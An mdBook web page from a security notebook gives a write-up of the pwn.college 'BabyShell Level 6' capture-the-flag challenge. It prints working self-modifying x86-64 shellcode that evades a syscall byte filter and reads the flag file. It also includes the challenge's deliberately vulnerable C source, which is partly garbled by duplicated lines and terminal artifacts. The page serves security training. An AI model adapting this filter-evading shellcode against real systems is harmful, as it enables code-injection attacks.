<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>BabyShell Level 6 - Exploitation Freaks</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.3.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.4.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.4.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.4.3.</strong> Naughty List</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.5.1.</strong> Split</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html" class="active"><strong aria-hidden="true">3.3.6.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">3.3.7.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">3.3.8.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">3.3.9.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">3.3.10.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-13.html"><strong aria-hidden="true">3.3.11.</strong> BabyReverse Level 13</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-15.html"><strong aria-hidden="true">3.3.12.</strong> BabyReverse Level 15</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">3.3.13.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">3.3.14.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">3.3.15.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li><li class="chapter-item expanded "><a href="flare-on_known.html"><strong aria-hidden="true">3.4.2.</strong> known</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">4.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">5.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">5.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">5.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">5.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">5.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="babyshell-level-6"><a class="header" href="#babyshell-level-6">BabyShell Level 6</a></h1>
<p>This one was a easy level, extremely similar to the last one we just did, but this time the first 4096 bytes of the program have been removed write permissions, this means we can't write shellcode on the stack unless we put 4096 bytes of junk before our shellcode.</p>
<p><em>Note that we still have the same filter on syscalls than the last challenge, for this reason we will reuse the shellcode i wrote.</em></p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    .rept 4096
    nop
    .endr

    # prepare syscall
    mov byte ptr[rip+label], 0x0f
    mov byte ptr[rip+label+1], 0x05
    lea r9, [rip+label]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor r10, r10

    # open flag file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9

label:
    .word 0x0000

    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+label2], 0x0f
    mov byte ptr[rip+label2+1], 0x05
    lea r9, [rip+label2]

    xor rsi, rsi
    xor r10, r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi,1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9
label2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+label3], 0x0f
    mov byte ptr[rip+label3+1], 0x05
    lea r9, [rip+label3]
    # exit
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

label3:
    .word 0x0000
</code></pre>
<p>Compile the shellcode with gcc <code>gcc -w -nostdlib -static solve.s -o solve</code>, then you can extract the bytes of the <code>.text section</code> using <code>objcopy --dump-section .text=solver ./solve</code>, then you can run the program with our solver file redirected to standard input <code>./babyshell_level6 &lt;solver</code>. </p>
<p>Another cool thing is that we are given the source code for this challenge which is the following one.</p>
<pre><code class="language-c">#define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
#include &lt;sys/mman.h&gt;                                                                                                                                                                                                               [66/1973]#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
#include &lt;unistd.h&gt;                                                                                                                                                                                                                          #include &lt;stdio.h&gt;
                                                                                                                                                                                                                                             #include &lt;capstone/capstone.h&gt;
                                                                                                                                                                                                                                             #define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
                                                                                                                                                                                                                                             void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                                                                                                                                                                                                                                                                            void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                               
        return;
    }                                                                                                                                                                                                                               [43/1973]
    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &amp;insn);
    if (count &gt; 0)
    {                                                                                                                                                                                                                                                size_t j;                                                                                                                                                                                                                                    printf(&quot;      Address      |                      Bytes                    |          Instructions\n&quot;);                                                                                                                                      printf(&quot;------------------------------------------------------------------------------------------\n&quot;);                                                                                                                              
        for (j = 0; j &lt; count; j++)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)insn[j].address);
            for (int k = 0; k &lt; insn[j].size; k++) printf(&quot;%02hhx &quot;, insn[j].bytes[k]);
            for (int k = insn[j].size; k &lt; 15; k++) printf(&quot;   &quot;);
            printf(&quot; | %s %s\n&quot;, insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf(&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;);                                                                                                                                                                            printf(&quot;      Address      |                      Bytes\n&quot;);                                                                                                                                                                                 printf(&quot;--------------------------------------------------------------------\n&quot;);                                                                                                                                                            for (unsigned int i = 0; i &lt;= shellcode_size; i += 16)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)shellcode_addr+i);
            for (int k = 0; k &lt; 16; k++) printf(&quot;%02hhx &quot;, ((uint8_t*)shellcode_addr)[i+k]);
            printf(&quot;\n&quot;);
        }
    }

    cs_close(&amp;handle);
}

void *shellcode_mem;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    assert(argc &gt; 0);

    printf(&quot;###\n&quot;);
    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
    printf(&quot;###\n&quot;);
    printf(&quot;\n&quot;);

    puts(&quot;This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them&quot;);
    puts(&quot;as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will&quot;);
    puts(&quot;practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing&quot;);
    puts(&quot;other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.\n&quot;);
    for (int i = 3; i &lt; 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode_mem = mmap((void *) 0x14c61000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    printf(&quot;[LEAK] Mapping shellcode memory at %p!\n&quot;, shellcode_mem);
    assert(shellcode_mem == (void *) 0x14c61000);

    puts(&quot;Reading 0x2000 bytes from stdin.\n&quot;);
    shellcode_size = read(0, shellcode_mem, 0x2000);
    assert(shellcode_size &gt; 0);

    puts(&quot;Executing filter...\n&quot;);
    puts(&quot;This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls&quot;);
    puts(&quot;are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05&quot;);
    puts(&quot;(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to&quot;);
    puts(&quot;insert the `syscall` instructions at runtime.\n&quot;);
    for (int i = 0; i &lt; shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t*)shellcode_mem + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf(&quot;Failed filter at byte %d!\n&quot;, i);
            exit(1);
        }
    }

    puts(&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;);
    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

    puts(&quot;This challenge is about to execute the following shellcode:\n&quot;);
    print_disassembly(shellcode_mem, shellcode_size);
    puts(&quot;&quot;);

    puts(&quot;Executing shellcode!\n&quot;);
    ((void(*)())shellcode_mem)();
</code></pre>
<p>First thing to note is that the program uses the <code>libcapstone</code> library as a disassembly framework, capstone will basically take the raw bytes we sent to it and disassemble them, then print the instructions to the screen. If you want to know more about disassembling raw bytes using <a href="http://www.capstone-engine.org">capstone</a>, make sure to check the section <a href="http://www.capstone-engine.org/lang_c.html">here</a> for the C language.</p>
<p>So in main we first allocate 0x2000 bytes of memory space at address 0x14c61000, then we read 2000 bytes of input at this address (our shellcode), and finally at the end we call our shellcode <code>((void(*)())shellcode_mem)()</code>.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="pwn-college-babyshell-level5.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="pwn-college-babyshell-level7.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="pwn-college-babyshell-level5.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="pwn-college-babyshell-level7.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
